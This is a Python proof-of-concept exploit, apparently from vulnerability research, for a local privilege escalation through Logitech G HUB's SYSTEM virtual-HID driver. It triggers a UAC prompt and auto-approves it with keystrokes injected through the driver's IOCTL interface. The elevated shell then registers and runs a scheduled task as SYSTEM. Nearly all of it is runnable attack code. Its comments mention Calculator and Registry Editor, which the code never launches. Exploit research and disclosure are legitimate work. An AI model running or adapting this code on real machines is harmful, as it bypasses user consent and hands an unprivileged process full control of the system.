#!/usr/bin/env python3
# Visible proof of the G HUB LPE: an unprivileged (Medium IL) process launches
# an ELEVATED cmd.exe (and Calculator) by triggering a UAC prompt and auto-
# approving it with keystrokes injected through the SYSTEM virtual-HID driver.
# The elevated cmd stays open (/k) showing "Administrator" + whoami, so the
# elevation is visible on screen.  VM snapshot only.  Authorized research.

import ctypes, ctypes.wintypes as wt, time, os, sys, getpass, subprocess, threading

k32=ctypes.WinDLL("kernel32",use_last_error=True); sh=ctypes.WinDLL("shell32",use_last_error=True)
GENERIC_RW=0xC0000000; OPEN_EXISTING=3; SHARE_RW=3; INVALID=wt.HANDLE(-1).value
k32.CreateFileW.restype=wt.HANDLE
k32.CreateFileW.argtypes=[wt.LPCWSTR,wt.DWORD,wt.DWORD,ctypes.c_void_p,wt.DWORD,wt.DWORD,wt.HANDLE]
k32.DeviceIoControl.restype=wt.BOOL
k32.DeviceIoControl.argtypes=[wt.HANDLE,wt.DWORD,ctypes.c_void_p,wt.DWORD,ctypes.c_void_p,wt.DWORD,ctypes.POINTER(wt.DWORD),ctypes.c_void_p]

IFACE=r"\\?\ROOT#SYSTEM#0001#{dfbedcdd-2148-416d-9e4d-cecc2424128c}"
IOCTL_FEED=0x2a200c
PROOF=r"C:\Users\user\_admin_demo_proof.txt"
CMD=r"C:\Windows\System32\cmd.exe"
# elevated cmd: show banner + whoami, record proof, launch Calculator, stay open
PARAMS=('/c color 4f'
        ' & title *** ADMINISTRATOR  --  launched by UNPRIVILEGED G HUB LPE ***'
        ' & echo ================================================'
        ' & echo  This elevated shell was started by a Medium-IL,'
        ' & echo  non-admin process -- UAC was auto-approved by'
        ' & echo  keystrokes injected through the SYSTEM G HUB driver.'
        ' & echo ================================================'
        ' & echo Running as: & whoami'
        f' & whoami > "{PROOF}" 2>&1 & whoami /groups | findstr /i S-1-16 >> "{PROOF}"'
        ' & echo. & echo Escalating to SYSTEM (spawning a live SYSTEM shell)...'
        ' & schtasks /create /tn LogiSysShell /ru SYSTEM /tr'
        ' "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\user\\spawn_system_cmd.ps1"'
        ' /sc once /st 00:00 /f >nul 2>&1 & schtasks /run /tn LogiSysShell >nul 2>&1'
        ' & ping -n 4 127.0.0.1 >nul')   # give the SYSTEM task time to open its window, then this launcher exits

class SEI(ctypes.Structure):
    _fields_=[("cbSize",wt.DWORD),("fMask",ctypes.c_ulong),("hwnd",wt.HWND),
      ("lpVerb",wt.LPCWSTR),("lpFile",wt.LPCWSTR),("lpParameters",wt.LPCWSTR),
      ("lpDirectory",wt.LPCWSTR),("nShow",ctypes.c_int),("hInstApp",wt.HINSTANCE),
      ("lpIDList",ctypes.c_void_p),("lpClass",wt.LPCWSTR),("hkeyClass",wt.HKEY),
      ("dwHotKey",wt.DWORD),("hIcon",wt.HANDLE),("hProcess",wt.HANDLE)]
sh.ShellExecuteExW.argtypes=[ctypes.POINTER(SEI)]; sh.ShellExecuteExW.restype=wt.BOOL

_see={}
def trigger():
    sei=SEI(); sei.cbSize=ctypes.sizeof(SEI); sei.fMask=0x40; sei.lpVerb="runas"
    sei.lpFile=CMD; sei.lpParameters=PARAMS; sei.nShow=5     # SW_SHOW -> visible window
    _see["ok"]=bool(sh.ShellExecuteExW(ctypes.byref(sei))); _see["err"]=ctypes.get_last_error()

def feed(h,d):
    r=wt.DWORD(0); b=ctypes.create_string_buffer(d,len(d))
    k32.DeviceIoControl(h,IOCTL_FEED,b,len(d),None,0,ctypes.byref(r),None)
def key(h,u,m=0):
    feed(h,bytes([m,0,u,0,0,0,0,0])); time.sleep(0.03); feed(h,bytes(8)); time.sleep(0.05)
def consent_up():
    try: return "consent.exe" in subprocess.run(["tasklist","/fi","imagename eq consent.exe"],capture_output=True,text=True).stdout.lower()
    except Exception: return False

def main():
    print("launcher:",getpass.getuser(),"pid",os.getpid())
    try: os.remove(PROOF)
    except OSError: pass
    h=k32.CreateFileW(IFACE,GENERIC_RW,SHARE_RW,None,OPEN_EXISTING,0,None)
    if h==INVALID or not h: print("open failed"); return 1
    threading.Thread(target=trigger,daemon=True).start()
    t0=time.time(); seen=False
    while time.time()-t0<12:
        if consent_up(): seen=True; break
        time.sleep(0.3)
    if seen:
        time.sleep(1.2)
        key(h,0x50); time.sleep(0.25); key(h,0x28)   # Left -> "Yes", Enter -> approve
    k32.CloseHandle(h)
    for _ in range(16):
        if os.path.exists(PROOF): break
        time.sleep(0.5)
    print("consent seen:",seen,"ShellExecuteEx ok:",_see.get("ok"),"err:",_see.get("err"))
    try: print("elevated whoami proof:\n"+open(PROOF).read())
    except Exception as e: print("proof not written:",e)
    print("elevated cmd + Registry Editor left running on the desktop as visible proof.")
    return 0

if __name__=="__main__": sys.exit(main())
